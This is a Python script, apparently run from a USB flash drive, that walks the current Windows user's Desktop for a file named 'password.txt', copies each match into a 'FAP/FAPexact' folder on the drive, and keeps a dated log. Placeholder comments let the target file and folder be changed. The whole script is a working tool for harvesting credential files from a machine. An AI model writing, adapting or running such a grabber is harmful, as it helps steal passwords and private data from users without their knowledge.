def main():
    import os, getpass, shutil; from datetime import date
    manual = True   # Manually start program

    #--------------------------------------------------------------Functions
    def find_files(filename, search_path):
        result = []
        # Walking top-down from the root
        for root, dir, files in os.walk(search_path):
            if filename in files:
                result.append(os.path.join(root, filename))
        return result

    def copy_file(filepath):
        '''Copy a file from a specific filepath.'''
        file = os.path.split(filepath)[1]
        fileTup = os.path.splitext(file)                            # Current file name and extension in tuple (name, extension)
        fileName = fileTup[0]                                       # Current file name
        fileExt = fileTup[1]                                        # Current file extension
        #fileCurrentPath = homeDir + f"/{fileName}{fileExt}"        # Current file path
        destination = flashDir + f"/{fileFolder}/{fileName}"
        destination = check_for_repeats(destination, fileExt)       # check for repeats and return correct directory
        destination += fileExt                                      # add extension
        shutil.copy2(filepath, destination)

    def check_for_repeats(destination, extension):
        '''Checks the destination path of a file to see if the a file of the same name already exists. If it does, " repeat(#)" is added to the end. Returns the modified directory.'''
        repeats = 1                                                             # sets repeat value to base "1"
        if os.path.exists(destination + extension):                             # if the file already exists in the destination folder...
                destination += f" repeat({repeats})"                            # add "repeat(1)" to the first dupe
                if os.path.exists(destination + extension):                     # if it STILL exists...
                    while os.path.exists(destination + extension):              # and WHILE it still exists...
                        destination = (destination[::-1].replace(f"({repeats})"[::-1], "", 1))[::-1] # remove the number and parenthesis from the end of the file name
                        repeats += 1                                            # increment the repeat value
                        destination += f"({repeats})"                           # add (#) with the incremented value
        return destination                                                      # return the end result

    def get_list_of_files(directory):
        '''Returns a list of files when given a directory'''
        filelist = []
        for root, dirs, files in os.walk(directory):
            for file in files:
                filelist.append(os.path.join(root, file))
        return filelist

    #--------------------------------------------------------------Init (username, files, etc)
    username = getpass.getuser()
    flashDir = os.getcwd()
    rootFolder = f"FAP"
    subFolder = rootFolder + f"/FAPexact"
    userFolder = subFolder + f"/{username}_FAPexact_data"
    fileFolder = userFolder + f"/{username}_FAPexact_files"
    logFolder = userFolder + f"/{username}_FAPexact_logs/"
    logName = logFolder + f"{username}_FAPexact_log_{date.today()}"
    
    print("Grabbed username")
    if not os.path.exists(rootFolder):
        os.mkdir(rootFolder)
    if not os.path.exists(subFolder):
        os.mkdir(subFolder)
    if not os.path.exists(userFolder):
        os.mkdir(userFolder)
    if not os.path.exists(logFolder):
        os.mkdir(logFolder)
    if not os.path.exists(fileFolder):
        os.mkdir(fileFolder)
    if not os.path.exists(logName + ".txt"):
        output = open(logName + ".txt", "a")
    else:
        i = 0
        origName = logName
        while os.path.exists(logName + ".txt"):
            logName = origName
            i += 1
            logName += f" ({i})"
        logName = origName + f" ({i})"
        output = open(logName + ".txt", "a")

    #--------------------------------------------------------------Find Specific Files

    print("==============Exact Search==============", file=output)
    print("Note: This will take a while\n\n", file=output)

    target = "password.txt"     # <----- PUT TARGET FILE HERE (with extension)
    driveDir = "C:/"    # <----- PUT TARGET OS
    usersDir = driveDir + "Users/"  # <----- PUT TARGET FILE HERE
    mainUserDir = usersDir + f"{username}/"
    desktopDir = mainUserDir + "Desktop/"
    targetDir = desktopDir  # <----- PUT TARGET FOLDER
    print(f"Target: '{target}'\n", file=output)
    print("---Files Found---", file=output)
    try:
        print(f"Trying to find '{target}'...")
        i = 0
        for file in find_files(target, targetDir):
            i += 1
            copy_file(file)
            print(f"{i}) '{target}' found at '{file}'.")
            print(f"File Copied: {file}", file=output)
    except:
        print(f"Failed to find {target}.", file=output)
    else:
        print(f"Finished searching for files. Found {i} file(s).\n")
        print(f"Found {i} file(s).\n", file=output)
        print("==========================================", file=output)

    print("Process complete.")
if __name__ == "__main__":
    main()